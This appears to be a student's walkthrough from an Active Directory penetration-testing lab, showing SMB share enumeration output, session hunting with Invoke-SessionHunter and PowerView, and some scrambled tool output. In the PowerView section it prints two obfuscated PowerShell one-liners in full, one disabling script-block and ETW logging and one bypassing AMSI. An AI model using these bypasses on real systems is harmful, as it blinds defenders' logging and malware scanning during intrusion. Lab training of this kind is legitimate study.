 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][02/20/2025 06:31] Scan Start
 [*][02/20/2025 06:31] Output Directory: C:\AD\Tools\\SmbShareHunt-02202025063120
 [*][02/20/2025 06:31] Importing computer targets from C:\AD\Tools\servers.txt
 [*][02/20/2025 06:31] 7 systems will be targeted
 [*][02/20/2025 06:31] - Skipping ping scan.
 [*][02/20/2025 06:31] Checking if TCP Port 445 is open on 7 computers
 [*][02/20/2025 06:31] - 7 computers have TCP port 445 open.
 [*][02/20/2025 06:31] Getting a list of SMB shares from 7 computers
 [*][02/20/2025 06:31] - 23 SMB shares were found.
 [*][02/20/2025 06:31] Getting share permissions from 23 SMB shares
 [*][02/20/2025 06:31] - 30 share permissions were enumerated.
 [*][02/20/2025 06:31] Identifying potentially excessive share permissions
 [*][02/20/2025 06:31] - 10 potentially excessive privileges were found on 4 shares across 3 systems.
 [*][02/20/2025 06:31] Getting directory listings from 4 SMB shares
 [*][02/20/2025 06:31] - Targeting up to 3 nested directory levels
 [*][02/20/2025 06:31] - 6 files and folders were enumerated.
 [*][02/20/2025 06:31] Scan Complete

[SNIP]
 
 [*][02/20/2025 06:31] Creating ShareGraph nodes and edges...
 [*][02/20/2025 06:31] Analysis Complete
 ---------------------------------------------------------------
 SHARE REPORT SUMMARY📌
 ---------------------------------------------------------------
 [*][02/20/2025 06:31] Domain: SmbHunt
 [*][02/20/2025 06:31] Start time: 02/20/2025 06:31:20
 [*][02/20/2025 06:31] End time: 02/20/2025 06:31:45
 [*][02/20/2025 06:31] Run time: 00:00:25.1958136
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] COMPUTER SUMMARY
 [*][02/20/2025 06:31] - 7 domain computers found.
 [*][02/20/2025 06:31] - 0 (0.00%) domain computers responded to ping. (No Ping)
 [*][02/20/2025 06:31] - 7 (100.00%) domain computers had TCP port 445 accessible.
 [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares that were non-default.
 [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares with potentially excessive privileges.
 [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares that allowed READ access.
 [*][02/20/2025 06:31] - 2 (28.57%) domain computers had shares that allowed WRITE access.
 [*][02/20/2025 06:31] - 1 (14.29%) domain computers had shares that are HIGH RISK.
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] SHARE SUMMARY
 [*][02/20/2025 06:31] - 23 shares were found. We expect a minimum of 14 shares
 [*][02/20/2025 06:31]   because 7 systems had open ports and there are typically two default shares.
 [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems were non-default.
 [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems are configured with 10 potentially excessive ACLs.
 [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems allowed READ access.
 [*][02/20/2025 06:31] - 2 (8.70%) shares across 2 systems allowed WRITE access.
 [*][02/20/2025 06:31] - 2 (8.70%) shares across 1 systems are considered HIGH RISK.
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] SHARE ACL SUMMARY
 [*][02/20/2025 06:31] - 30 ACLs were found.
 [*][02/20/2025 06:31] - 30 (100.00%) ACLs were associated with non-default shares.
 [*][02/20/2025 06:31] - 10 (33.33%) ACLs were found to be potentially excessive.
 [*][02/20/2025 06:31] - 6 (20.00%) ACLs were found that allowed READ access.
 [*][02/20/2025 06:31] - 2 (6.67%) ACLs were found that allowed WRITE access.
 [*][02/20/2025 06:31] - 5 (16.67%) ACLs were found that are associated with HIGH RISK share names.
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] - The most common share names are:
 [*][02/20/2025 06:31] - 4 of 4 (100.00%) discovered shares are associated with the top 200 share names.
 [*][02/20/2025 06:31]   - 1 AI📁
 [*][02/20/2025 06:31]   - 1 studentshareadmin
 [*][02/20/2025 06:31]   - 1 C$
 [*][02/20/2025 06:31]   - 1 ADMIN$
 [*] -----------------------------------------------
 [*][02/20/2025 06:31]   - Generating HTML Report
 [*][02/20/2025 06:31]   - Estimated generation time: 1 minute or less
 [*][02/20/2025 06:31]   - All files written to C:\AD\Tools\\SmbShareHunt-02202025063120📌
 [*][02/20/2025 06:31]   - Done.
```

``:
```
[SNIP]

 ---------------------------------------------------------------
 |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][03/11/2025 03:05] Scan Start
 [*][03/11/2025 03:05] Output Directory: C:\AD\Tools\\SmbShareHunt-03112025030549
 [*][03/11/2025 03:05] Importing computer targets from C:\AD\Tools\servers.txt
 [*][03/11/2025 03:05] 4 systems will be targeted
 [*][03/11/2025 03:05] - Skipping ping scan.
 [*][03/11/2025 03:05] Checking if TCP Port 445 is open on 4 computers
 [*][03/11/2025 03:05] - 4 computers have TCP port 445 open.
 [*][03/11/2025 03:05] Getting a list of SMB shares from 4 computers
ComputerName : mgmtsrv.tech.finance.corp
IpAddress    : 172.16.5.156

ShareName    : C$
ComputerName : dbserver31.tech.finance.corp
ShareDesc    : Default share
IpAddress    : 172.16.6.31
Sharetype    : 2147483648
ShareName    : ADMIN$
ShareAccess  : No

ShareDesc    : Remote Admin
Sharetype    : 2147483648
ShareAccess  : No
ComputerName : mgmtsrv.tech.finance.corp

IpAddress    : 172.16.5.156
ComputerName : dbserver31.tech.finance.corp
ShareName    : IPC$
IpAddress    : 172.16.6.31
ShareDesc    : Remote IPC
ShareName    : C$
Sharetype    : 2147483651
ShareDesc    : Default share
ShareAccess  : No
Sharetype    : 2147483648
ShareAccess  : No


ComputerName : dbserver31.tech.finance.corp
No credentials found.
select : Property "OperatingSystem" cannot be found.
At C:\AD\Tools\PowerHuntShares.psm1:2265 char:92
+ ... ComputerName | select OperatingSystem -ExpandProperty OperatingSystem
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (@{ComputerName=studvm.tech.finance.corp}:PSObject) [Select-Object], PSArgumentException
    + FullyQualifiedErrorId : ExpandPropertyNotFound,Microsoft.PowerShell.Commands.SelectObjectCommand
```
❌

`dir C:\AD\Tools\SmbShareHunt-02202025063120`:
```
    Directory: C:\AD\Tools\SmbShareHunt-02202025063120


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/20/2025   6:31 AM                Results
-a----         2/20/2025   6:31 AM        1069450 Summary-Report-SmbHunt.html📌
```

**Domain Enumeration | Local Admin Access**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`

`Find-PSRemotingLocalAdminAccess`:
```
```
❌

**Domain Enumeration | Session Hunting with Invoke-SessionHunter**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`

`type C:\AD\Tools\servers.txt`:
```
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

`Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access`:
```
[+] Elapsed time: 0:0:3.188

HostName     UserSession          Access
--------     -----------          ------
dbserver31🖥️ TECH\sqlserversync👤  False
mgmtsrv🖥️    TECH\techservice👤    False
```

**Domain Enumeration | Session Hunting with PowerView**

???

![Run as administrator](learning_objectives_run_as_administrator.png)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`type C:\AD\Tools\sbloggingbypass.txt`:
```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

`iex (type C:\AD\Tools\sbloggingbypass.txt)`

`type C:\AD\Tools\amsibypass.txt`:
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

`iex (type C:\AD\Tools\amsibypass.txt)`

`Import-Module C:\AD\Tools\PowerView.ps1`

`Find-DomainUserLocation`:
```
UserDomain      : DCORP-STD422🖥️
UserName        : Administrator👤
ComputerName    : dcorp-std422.dollarcorp.moneycorp.local
IPAddress       : 172.16.100.22
SessionFrom     :
SessionFromName :
LocalAdmin      :
```

---

### Local Privilege Escalation
